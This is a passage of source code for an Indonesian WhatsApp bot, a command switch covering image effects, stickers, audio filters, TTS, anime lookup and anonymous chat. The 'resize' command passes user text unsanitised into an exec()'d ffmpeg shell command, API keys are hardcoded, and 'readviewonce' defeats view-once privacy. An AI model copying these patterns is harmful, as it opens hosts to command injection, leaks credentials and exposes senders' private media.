if (!quoted) return newReply(`Fotonya Mana?`)
if (!/image/.test(mime)) return newReply(`Send/Reply Foto Dengan Caption ${prefix + command}`)
newReply(mess.wait)
const media = await juna.downloadAndSaveMediaMessage(quoted)
const anu = await TelegraPH(media)
juna.sendMessage(m.chat, { image: { url: `https://skizo.tech/api/removebg?apikey=chiwa&url=${anu}` }, caption: 'Done Ayangg >///<'}, { quoted: m})
}
limitAdd(m.sender, limit)
break
case 'resize': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (!q) return newReply(`Masukan ukuran panjangxlebar, contoh ${prefix+command} 300x300`)
newReply(mess.wait) 
let panjang = q.split('x')[0] 
let lebar = q.split('x')[1] 
let media = await juna.downloadAndSaveMediaMessage(quoted)
let ran = getRandom('.jpeg')
exec(`ffmpeg -i ${media} -vf scale=${panjang}:${lebar} ${ran}`, async (err) => {
fs.unlinkSync(media)
if (err) return newReply(`Err: ${err}`)
let buffer453 = fs.readFileSync(ran)
await juna.sendMessage(m.chat, {mimetype: 'image/jpeg', image: buffer453, caption: `Done Ayang>///<`}, { quoted: fkontak })
fs.unlinkSync(ran)
})
}
limitAdd(m.sender, limit)
break
case 'postig': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!quoted) return newReply(`Fotonya Mana?`)
if (!/image/.test(mime)) return newReply(`Send/Reply Foto Dengan Caption ${prefix + command}`)
newReply(mess.wait)
const media = await juna.downloadAndSaveMediaMessage(quoted)
const anu = await TelegraPH(media)
juna.sendMessage(m.chat, { image: { url: `https://api.zeeoneofc.my.id/api/image-effect/instagram2?apikey=${setting.BotKey}&url=${anu}` }, caption: 'Cie Fotonya Dipost Bot'}, { quoted: m})
}
limitAdd(m.sender, limit)
break
case 'gay': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
newReply(mess.wait)
if (!quoted) return newReply(`Fotonya Mana?`)
if (!/image/.test(mime)) return newReply(`Send/Reply Foto Dengan Caption ${prefix + command}`)
newReply(mess.wait)
const media = await juna.downloadAndSaveMediaMessage(quoted)
const anu = await TelegraPH(media)
juna.sendMessage(m.chat, { image: { url: `https://api.zeeoneofc.my.id/api/image-effect/${command}?apikey=${setting.BotKey}&url=${anu}` }, caption: 'Awas Ada Gay😱'}, { quoted: m})
}
limitAdd(m.sender, limit)
break
case 'brazzers': case 'triggered': case 'jail': case 'rip': case 'wanted': case 'fire': case 'beautiful':  case 'wasted':{
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
newReply(mess.wait)
if (!quoted) return newReply(`Fotonya Mana?`)
if (!/image/.test(mime)) return newReply(`Send/Reply Foto Dengan Caption ${prefix + command}`)
newReply(mess.wait)
const media = await juna.downloadAndSaveMediaMessage(quoted)
const anu = await TelegraPH(media)
juna.sendMessage(m.chat, { image: { url: `https://api.zeeoneofc.my.id/api/image-effect/${command}?apikey=${setting.BotKey}&url=${anu}` }, caption: 'Done Ayang >///<'}, { quoted: m})
}
limitAdd(m.sender, limit)
break
case 'remini': case 'hd': case 'hdr': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!quoted) return newReply(`Fotonya Mana?`)
if (!/image/.test(mime)) return newReply(`Send/Reply Foto Dengan Caption ${prefix + command}`)
newReply(mess.wait)
let media = await quoted.download()
let proses = await remini(media, "enhance");
juna.sendMessage(m.chat, { image: proses, caption: '_Maaf Kak, Kalau Hasilnya Nggak Bagus_ T_T'}, { quoted: m})
}
limitAdd(m.sender, limit)
break

// Converter & Tools Menu
case 'patrick': case 'popoci': case 'sponsbob': case 'kawan-sponsbob': case 'awoawo': case 'chat': case 'dbfly': case 'dino-kuning': case 'doge': case 'gojosatoru': case 'hope-boy': case 'jisoo': case 'kr-robot': case 'kucing': case 'manusia-lidi': case 'menjamet': case 'meow': case 'nicholas': case 'tyni':
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
let dino = `https://api.zeeoneofc.my.id/api/telegram-sticker/${command}?apikey=${setting.BotKey}`
juna.sendStickerFromUrl(m.chat, dino, m, {packname: `Created By ${setting.botName}\n${tanggal(new Date())}` , author: `Owner ${setting.ownerName}\nTime ${time}` })
limitAdd(m.sender, limit)
break
case 'qc':{
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!text) return newReply ('Masukkan Teks') 
let ppnyauser = await await juna.profilePictureUrl(m.sender, 'image').catch(_ => 'https://telegra.ph/file/6880771a42bad09dd6087.jpg')
const rest = await quote(text, pushname, ppnyauser)
let stiker = await sticker5(rest.result, false, `Created By ${setting.botName}\n${tanggal(new Date())}`, `Owner ${setting.ownerName}\nTime ${time}`)
if (stiker) return juna.sendFile(m.chat, stiker, 'Quotly.webp', '', m)
}
limitAdd(m.sender, limit)
break
case 'stiker': case 'sticker': case 's': case 'stickergif': case 'sgif': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
addCountCmd('#sticker', m.sender, _cmd)
if (!quoted) return newReply(`Balas Video/Image Dengan Caption ${prefix + command}`)
if (/image/.test(mime)) {
let media = await juna.downloadAndSaveMediaMessage(quoted, + new Date * 1)
await juna.imgToSticker(m.chat, media, m, { packname: `Created By ${setting.botName}\n${tanggal(new Date())}` , author: `Owner ${setting.ownerName}\nTime ${time}` })
await fs.unlinkSync(media)
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return newReply('Maksimal 10 detik!')
let media = await juna.downloadAndSaveMediaMessage(quoted, + new Date * 1)
await juna.vidToSticker(m.chat, media, m, { packname: `Created By ${setting.botName}\n${tanggal(new Date())}` , author: `Owner ${setting.ownerName}\nTime ${time}` })
await fs.unlinkSync(media)
} else if (/sticker/.test(mime)) {
let media = await juna.downloadAndSaveMediaMessage(quoted, + new Date * 1)
await juna.sendStickerFromUrl(from, media, m, {packname: `Created By ${setting.botName}\n${tanggal(new Date())}` , author: `Owner ${setting.ownerName}\nTime ${time}` })
await fs.unlinkSync(media)
} else newReply(`Balas Video/Image Dengan Caption ${prefix + command}`)
}
limitAdd(m.sender, limit)
break
case 'stickerwm': case 'swm': case 'stickergifwm': case 'sgifwm': case 'wm': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!quoted) return newReply(`Balas Video/Image Dengan Caption ${prefix + command} teks1|teks2`)
addCountCmd('#stickerwm', m.sender, _cmd)
teks1 = text.split('|')[0] ? text.split('|')[0] : ''
teks2 = text.split('|')[1] ? text.split('|')[1] : ''
newReply(mess.wait)
if (/image/.test(mime)) {
let media = await quoted.download()
let stiker = await sticker5(media, false, `${teks1}`, `${teks2}`)
if (stiker) return juna.sendFile(m.chat, stiker, 'Quotly.webp', '', m)
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return newReply('Maksimal 10 detik!')
let media = await quoted.download()
let stiker = await sticker5(media, false, `${teks1}`, `${teks2}`)
if (stiker) return juna.sendFile(m.chat, stiker, 'Quotly.webp', '', m)
} else {
newReply(`Balas Video/Image Dengan Caption ${prefix + command} teks1|teks2`)
}
}
limitAdd(m.sender, limit)
break
case 'smeme': case 'stickmeme': case 'stikmeme': case 'stickermeme': case 'stikermeme': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
addCountCmd('#smeme', m.sender, _cmd)
 if (!/webp/.test(mime) && /image/.test(mime)) {
newReply(mess.wait)
atas = text.split('|')[0] ? text.split('|')[0] : '-'
bawah = text.split('|')[1] ? text.split('|')[1] : '-'
mee = await juna.downloadAndSaveMediaMessage(quoted)
mem = await TelegraPh(mee)
let smeme = `https://api.memegen.link/images/custom/${encodeURIComponent(atas)}/${encodeURIComponent(bawah)}.png?background=${mem}`
let stiker = await sticker5(smeme, false, `Created By ${setting.botName}\n${tanggal(new Date())}`, `Owner ${setting.ownerName}\nTime ${time}`)
if (stiker) return juna.sendFile(m.chat, stiker, 'Quotly.webp', '', m)
} else {
newReply(`Kirim/reply image dengan caption ${prefix + command} text1|text2`)
}
}
limitAdd(m.sender, limit)
break 
case 'tourl':{
const uploadFile = require('./lib/uploadFile') 
const uploadImage = require('./lib/uploadImage') 
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
try{
let q = m.quoted ? m.quoted : m
  let mime = (q.msg || q).mimetype || ''
  if (!mime) throw '*send/reply your media with caption .tourl*'
  let media = await q.download()
  let isTele = /image\/(png|jpe?g|gif)|video\/mp4/.test(mime)
  let link = await (isTele ? uploadImage : uploadFile)(media)
  newReply(`┌  • *U p l o a d - F i l e*
│  ◦ *Size:* ${media.length}
└  ◦ *Link:* ${link}`)
} catch (error) {
newReply(`Server sedang error!`);
}
}
break

case 'animeapaini':

case 'animeapa': {

    try {

        if (isBan) return newReply('Lu di ban kocak awokwok');

        if (!quoted) return newReply(`Fotonya Mana?\nHarap dicatat untuk mengcrop foto agar tidak terlihat bingkai hitam dipinggir yang menyebabkan hasil penelusuran tidak akurat`);

        if (!/image/.test(mime)) return newReply(`Send/Reply Foto Dengan Caption ${prefix + command}\nHarap dicatat untuk mengcrop foto agar tidak terlihat bingkai hitam dipinggir yang menyebabkan hasil penelusuran tidak akurat`);

        newReply('Bot sedang mengirim foto ke server API\nUntuk hasil yang akurat dimohon untuk mengcrop foto agar tidak ada bingkai hitam dipinggir agar hasil penelusuran akurat');

        const media = await juna.downloadAndSaveMediaMessage(quoted);

        const anu = await TelegraPH(media);

        const chiwa = await fetchJson(`https://api.lolhuman.xyz/api/wait?apikey=6b882dde90583a8ea51d4fcf&img=${anu}`);

        

        const judulz = chiwa.result.title_romaji;

        const jepangz = chiwa.result.title_native;

        const enz = chiwa.result.title_english;

        const eps = chiwa.result.episode;

        const pada = chiwa.result.at;

        const videonya = chiwa.result.video;

        const akurasi = chiwa.result.similarity;

        

        juna.sendMessage(m.chat, { video: { url: videonya }, caption: `*Judul Anime*: \n${judulz}\n\n*Kanji*:\n${jepangz}\n\n*EN*:\n${enz}\n\n*Episode:*\n${eps}\n\n*Waktu*:\n${pada}\n\n*Tingkat Akurasi*:\n${akurasi}`}, { quoted: m});

    } catch (error) {

        console.error(error); // log the error for debugging

        return newReply('Error Njenk kontol jembot asu memek🗿');

    }

}
break
case 'tebakgender': {
  if (isBan) return newReply('Lu diban kocak')
  if (!isPremium) return newReply('Khusus premiuk njenk akwowkwowi')
  if (!quoted) return newReply(`Fotonya Mana?`);
  if (!/image/.test(mime)) return newReply(`Send/Reply Foto Dengan Caption ${prefix + command}`);
  await newReply('Tunggu sayank')
  const media = await juna.downloadAndSaveMediaMessage(quoted);
  const anu = await TelegraPH(media);
  let gender = await fetchJson(`https://skizo.tech/api/gender-detector?apikey=chiwa&url=${anu}`)
  const durasi = gender.duration[0]
  const mungkin = gender.gender[0].probability[0]
  const gendernya = gender.gender[0].value[0]
  if (gendernya === 'female') {
        await juna.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/412fe8b078ecb661faada.jpg' }, caption: `*Gender*\nkiw kiw cewek\n\n*Waktu Response*\n${durasi}\n\n*Akurasi*\n${mungkin}%`}, { quoted: m});
    } else if (gendernya === 'male') {
        await juna.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/412fe8b078ecb661faada.jpg' }, caption: `*Gender*\nCowok nih boss🥵🥵🥵\n\n*Waktu Response*\n${durasi}\n\n*Akurasi*\n${mungkin}%`}, { quoted: m});
    } else {
        return newReply('Anjenk AI nya kaga tau gender nya apa 🥵🥵🥵') // Jika jenis kelamin tidak dikenali, kembalikan nilai aslinya
    }
  
  
  
}
break
case 'mangaapa': case 'mangaapaini': {

if (isBan) return newReply('Lu di ban kocak awokwok') 

if (!quoted) return newReply(`Fotonya Mana?\nHarap dicatat untuk mengcrop foto agar tidak terlihat bingkai hitam dipinggir yang menyebabkan hasil penelusuran tidak akurat`)

if (!/image/.test(mime)) return newReply(`Send/Reply Foto Dengan Caption ${prefix + command}\nHarap dicatat untuk mengcrop foto agar tidak terlihat bingkai hitam dipinggir yang menyebabkan hasil penelusuran tidak akurat`)

newReply('Bot sedang mengirim foto ke server API\nUntuk hasil yang akurat dimohon untuk mengcrop foto agar tidak ada bingkai hitam dipinggir agar hasil penelusuran akurat')

const media = await juna.downloadAndSaveMediaMessage(quoted)

const anu = await TelegraPH(media)

let chiwa = await fetchJson(`https://api.lolhuman.xyz/api/wmit?apikey=6b882dde90583a8ea51d4fcf&img=${anu}`)
const judulzz = chiwa.result[0].title
const chapter = chiwa.result[0].part
const link = chiwa.result[0].urls
const akurasizz = chiwa.result[0].similarity




juna.sendMessage(m.chat, { image: { url: anu }, caption: `*Judul Manga*: \n${judulzz}\n\n*Chapter*:\n${chapter}\n\n*Link Baca*:\n${link}\n\n*Tingkat Akurasi:*\n${akurasizz}\n`}, { quoted: m})

}

break




case 'toimage': case 'toimg': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
addCountCmd('#toimage', m.sender, _cmd)
if (!quoted) return newReply('Reply Image')
if (!/webp/.test(mime)) return newReply (`Balas sticker dengan caption *${prefix + command}*`)
newReply(mess.wait)
let media = await juna.downloadAndSaveMediaMessage(quoted)
let ran = await getRandom('.png')
exec(`ffmpeg -i ${media} ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) throw err
let buffer = fs.readFileSync(ran)
juna.sendMessage(m.chat, { image: buffer }, { quoted: m })
fs.unlinkSync(ran)
})
}
limitAdd(m.sender, limit)
break
case 'readvo': case 'readviewonce': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (!m.quoted) throw 'Reply gambar/video yang ingin Anda lihat'
  if (m.quoted.mtype !== 'viewOnceMessageV2') throw 'Ini bukan pesan view-once.'
  let msg = m.quoted.message
  let type = Object.keys(msg)[0]
  let media = await downloadContentFromMessage(msg[type], type == 'imageMessage' ? 'image' : 'video')
  let buffer = Buffer.from([])
  for await (const chunk of media) {
    buffer = Buffer.concat([buffer, chunk])
  }
  if (/video/.test(type)) {
    return juna.sendFile(m.chat, buffer, 'media.mp4', msg[type].caption || '', m)
  } else if (/image/.test(type)) {
    return juna.sendFile(m.chat, buffer, 'media.jpg', msg[type].caption || '', m)
  }
}
break
case 'bass':
case 'blown':
case 'deep':
case 'earrape':
case 'fast':
case 'fat':
case 'nightcore':
case 'reverse':
case 'robot':
case 'slow':
case 'smooth':
case 'tupai':
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
try {
let set;
if (/bass/.test(command))
set = "-af equalizer=f=54:width_type=o:width=2:g=20";
if (/blown/.test(command)) set = "-af acrusher=.1:1:64:0:log";
if (/deep/.test(command)) set = "-af atempo=4/4,asetrate=44500*2/3";
if (/earrape/.test(command)) set = "-af volume=12";
if (/fast/.test(command))
set = '-filter:a "atempo=1.63,asetrate=44100"';
if (/fat/.test(command))
set = '-filter:a "atempo=1.6,asetrate=22100"';
if (/nightcore/.test(command))
set = "-filter:a atempo=1.06,asetrate=44100*1.25";
if (/reverse/.test(command)) set = '-filter_complex "areverse"';
if (/robot/.test(command))
set =
"-filter_complex \"afftfilt=real='hypot(re,im)*sin(0)':imag='hypot(re,im)*cos(0)':win_size=512:overlap=0.75\"";
if (/slow/.test(command))
set = '-filter:a "atempo=0.7,asetrate=44100"';
if (/smooth/.test(command))
set =
"-filter:v \"minterpolate='mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120'\"";
if (/tupai/.test(command))
set = '-filter:a "atempo=0.5,asetrate=65100"';
if (/audio/.test(mime)) {
m.reply(mess.wait);
let media = await juna.downloadAndSaveMediaMessage(quoted);
let ran = getRandom(".mp3");
exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(media);
if (err) return m.reply(err);
let buff = fs.readFileSync(ran);
juna.sendMessage(
m.chat,
{ audio: buff, mimetype: "audio/mpeg" },
{ quoted: m }
);
fs.unlinkSync(ran);
});
} else
newReply(
`Balas audio yang ingin diubah dengan caption *${
prefix + command
}*`
);
} catch (e) {
newReply(e);
}
break;
case'toptv':{
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
const { toPTT } = require('./lib/converter')
const { MessageType } = require('@adiwajshing/baileys')
  let q = m.quoted ? m.quoted : m
  if (!/video|audio/.test(mime)) throw `Balas video atau voice note yang ingin diubah ke mp3 dengan caption *${prefix + command}*`
  let media = await q.download()
let dataVideo = { ptvMessage: m.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage }
juna.relayMessage(m.chat, dataVideo, {})
}
limitAdd(m.sender, limit) 
break
case 'tovn': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
addCountCmd('#tovn', m.sender, _cmd)
 if (!/video/.test(mime) && !/audio/.test(mime)) return newReply (`Reply Video/Vn Yang Ingin Dijadikan MP3 Dengan Caption ${prefix + command}`)
if (!quoted) return newReply (`Reply Video/Vn Yang Ingin Dijadikan MP3 Dengan Caption ${prefix + command}`)
newReply(mess.wait)
let media = await quoted.download()
let { toAudio } = require('./lib/converter')
let audio = await toAudio(media, 'mp4')
juna.sendMessage(m.chat, {audio, mimetype:'audio/mpeg', ptt: true}, { quoted : m })
}
limitAdd(m.sender, limit)
break
case 'toaudio': case 'tomp3':{
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
addCountCmd('#tomp3', m.sender, _cmd)
 if (!/video/.test(mime) && !/audio/.test(mime)) return newReply (`Reply Video/Vn Yang Ingin Dijadikan MP3 Dengan Caption ${prefix + command}`)
if (!quoted) return newReply (`Reply Video/Vn Yang Ingin Dijadikan MP3 Dengan Caption ${prefix + command}`)
newReply(mess.wait)
let media = await quoted.download()
let { toAudio } = require('./lib/converter')
let audio = await toAudio(media, 'mp4')
juna.sendMessage(m.chat, {audio, mimetype: 'audio/mpeg'}, { quoted : m })
}
limitAdd(m.sender, limit)
break
case "ttp": case 'attp':{
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
addCountCmd('#attp', m.sender, _cmd)
if (!text) return newReply(`Example : ${prefix + command} halo`)
if(text.length > 20) return newReply("Maksimal 20 karakter")
newReply(mess.wait)
await juna.sendStickerFromUrl(m.chat, `https://api.zeeoneofc.my.id/api/canvas/${command}?text=${q}&apikey=${setting.BotKey}`, m, { packname: `Created By ${setting.botName}\n${tanggal(new Date())}` , author: `Owner ${setting.ownerName}\nTime ${time}` })
}
limitAdd(m.sender, limit)
break
case 'emojimix': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
addCountCmd('#emojimix', m.sender, _cmd)
let [emoji1, emoji2] = text.split`+`
if (!emoji1) return newReply(`Example : ${prefix + command} 😅+💩`)
if (!emoji2) return newReply(`Example : ${prefix + command} 😅+💩`)
let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
for (let res of anu.results) {
let encmedia = await juna.sendStickerFromUrl(m.chat, res.url, m, { packname: `Created By ${setting.botName}\n${tanggal(new Date())}` , author: `Owner ${setting.ownerName}\nTime ${time}`, categories: res.tags })
}
}
limitAdd(m.sender, limit)
break
case'nulis':
if (isBan) return newReply('Lu di ban kocak awokwok') 
addCountCmd('#nulis', m.sender, _cmd)
newReply(`*Pilihan Fitur Nulis*
1. ${prefix}nuliskiri
2. ${prefix}nuliskanan
3. ${prefix}foliokiri
4. ${prefix}foliokanan

Contoh:
${prefix}nuliskiri Juna Selebew`)
break
case'nuliskiri': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!text) return newReply(`Gunakan dengan cara ${prefix+command} text\n\nContoh : ${prefix+command} juna`)
newReply(mess.wait)
const tulisan = body.slice(11)
addCountCmd('#nuliskiri', m.sender, _cmd)
juna.sendMessage(m.chat, {image:{url:`https:\/\/api.zeeoneofc.my.id/api/canvas/${command}?text=${q}&apikey=${setting.BotKey}`}, caption: "Nih kak"}, {quoted: m}).catch(async _ => await newReply("apikey sedang eror"))
limitAdd(m.sender, limit)
}
limitAdd(m.sender, limit)
break
case'nuliskanan': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!text) return newReply(`Gunakan dengan cara ${prefix+command} text\n\nContoh : ${prefix+command} juna`)
newReply(mess.wait)
const tulisan = body.slice(12)
addCountCmd('#nuliskanan', m.sender, _cmd)
juna.sendMessage(m.chat, {image:{url:`https:\/\/api.zeeoneofc.my.id/api/canvas/${command}?text=${q}&apikey=${setting.BotKey}`}, caption: "Nih kak"}, {quoted: m}).catch(async _ => await newReply("apikey sedang eror"))
limitAdd(m.sender, limit)
}
limitAdd(m.sender, limit)
break
case'foliokiri': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!text) return newReply(`Gunakan dengan cara ${prefix+command} text\n\nContoh : ${prefix+command} juna`)
newReply(mess.wait)
const tulisan = body.slice(11)
addCountCmd('#foliokiri', m.sender, _cmd)
juna.sendMessage(m.chat, {image:{url:`https:\/\/api.zeeoneofc.my.id/api/canvas/${command}?text=${q}&apikey=${setting.BotKey}`}, caption: "Nih kak"}, {quoted: m}).catch(async _ => await newReply("apikey sedang eror"))
limitAdd(m.sender, limit)
}
limitAdd(m.sender, limit)
break
case'foliokanan': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!text) return newReply(`Gunakan dengan cara ${prefix+command} text\n\nContoh : ${prefix+command} juna`)
newReply(mess.wait)
const tulisan = body.slice(12)
addCountCmd('#foliokanan', m.sender, _cmd)
juna.sendMessage(m.chat, {image:{url:`https:\/\/api.zeeoneofc.my.id/api/canvas/${command}?text=${q}&apikey=${setting.BotKey}`}, caption: "Nih kak"}, {quoted: m}).catch(async _ => await newReply("apikey sedang eror"))
limitAdd(m.sender, limit)
}
limitAdd(m.sender, limit)
break
case 'speak':{
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!text) return newReply(`Gunakan dengan cara ${prefix+command} text\n\nContoh : ${prefix+command} Halo semuanya`)
await juna.sendPresenceUpdate('recording', m.chat);
var suara = await fetchJson(`https://skizo.tech/api/tts-anime?text=${text}&lang=mix&voice=paimon&speed=0.65&symbol=y&apikey=${setting.XznKey}`)
juna.sendMessage(m.chat, {audio: {url: suara.data.url}, mimetype: 'audio/mpeg', ptt: true}, {quoted:m})
}
limitAdd(m.sender, limit)
break
case'say':{
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!text) return newReply(`Gunakan dengan cara ${prefix+command} text\n\nContoh : ${prefix+command} juna`)
addCountCmd('#say', m.sender, _cmd)
var lang = text.split("--")[1]
if (!lang) lang = 'id'
long = 'id'
function tts(text, long = 'id') {
//console.log(lang, text)
return new Promise((resolve, reject) => {
try {
let tts = gtts(long)
let filePath = path.join(__dirname, './lib', (1 * new Date) + '.wav')
tts.save(filePath, text, () => {
resolve(fs.readFileSync(filePath))
fs.unlinkSync(filePath)
})
} catch (e) { reject(e) }
})
}

let res
try { res = await tts(text, long) }
catch (e) {
newReply(e + '')
res = await tts(text)
} finally {
juna.sendMessage(m.chat, {audio: res, mimetype: 'audio/mpeg', ptt: true}, {})
}
limitAdd(m.sender, limit)
}
limitAdd(m.sender, limit)
break
case 'translate': case 'tr': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (!text) return newReply(`Contoh :

1. Kirim perintah ${prefix + command} *kode bahasa* *teks*
• Contoh : ${prefix + command} id halo
2. Reply chat dengan caption ${prefix + command} *kode bahasa*
• Contoh : ${prefix + command} id halo
Daftar bahasa yang di dukung : https://cloud.google.com/translate/docs/languages`)
let teks = m.quoted ? quoted.text : quoted.text.split(args[0])[1]
translate(teks, { to: args[0] }).then((res) => {
juna.sendText(m.chat, `${res.text}`, m)
})
}
limitAdd(m.sender, limit)
break

case 'anonymouschat': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (m.isGroup) return newReply('Fitur Tidak Dapat Digunakan Untuk Group!')
newReply(`Hi ${pushname} Welcome To Anonymous Chat\n\n${prefix}start -- _mencari partner_`)
 }
break
case 'keluar': case 'leave': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (m.isGroup) return newReply('Fitur Tidak Dapat Digunakan Untuk Group!')
this.anonymous = this.anonymous ? this.anonymous : {}
let room = Object.values(this.anonymous).find(room => room.check(m.sender))
if (!room) {
newReply(`Kamu Sedang Tidak Berada Di Sesi Anonymous\n\n${prefix}start -- _mencari partner_`)
throw false
}
newReply('Berhasil keluar dari anonymous chat')
let other = room.other(m.sender)
if (other) await juna.sendText(other, `Partner Telah Meninggalkan Sesi Anonymous`, m)
delete this.anonymous[room.id]
if (command === 'leave') 
break
}
break
case 'mulai': case 'start': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (m.isGroup) return newReply('Fitur Tidak Dapat Digunakan Untuk Group!')
this.anonymous = this.anonymous ? this.anonymous : {}
if (Object.values(this.anonymous).find(room => room.check(m.sender))) {
newReply(`Kamu Masih Berada Di dalam Sesi Anonymous\n\n${prefix}keluar -- _keluar dari sesi chat_`)
throw false
}
let room = Object.values(this.anonymous).find(room => room.state === 'WAITING' && !room.check(m.sender))
if (room) {
juna.sendMessage(room.a, {text: `Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan\n\n${prefix}skip -- _mencari partner lain_\n${prefix}stop -- _menghentikan sesi chat_`})
room.b = m.sender
room.state = 'CHATTING'
newReply(`Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan\n\n${prefix}skip -- _mencari partner lain_\n${prefix}stop -- _menghentikan sesi chat_`)
} else {
let id = + new Date
this.anonymous[id] = {
id,
a: m.sender,
b: '',
state: 'WAITING',
check: function (who = '') {
return [this.a, this.b].includes(who)
},
other: function (who = '') {
return who === this.a ? this.b : who === this.b ? this.a : ''
},
}
newReply(`Mohon Tunggu Sedang Mencari Partner`)
}
break
}
case 'next': case 'lanjut': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (m.isGroup) return newReply('Fitur Tidak Dapat Digunakan Untuk Group!')
this.anonymous = this.anonymous ? this.anonymous : {}
let romeo = Object.values(this.anonymous).find(room => room.check(m.sender))
if (!romeo) {
newReply(`Kamu Sedang Tidak Berada Di Sesi Anonymous\n\n${prefix}start -- _mencari partner_`)
throw false
}
let other = romeo.other(m.sender)
if (other) await juna.sendText(other, `Partner Telah Meninggalkan Sesi Anonymous`, m)
delete this.anonymous[romeo.id]
let room = Object.values(this.anonymous).find(room => room.state === 'WAITING' && !room.check(m.sender))
if (room) {
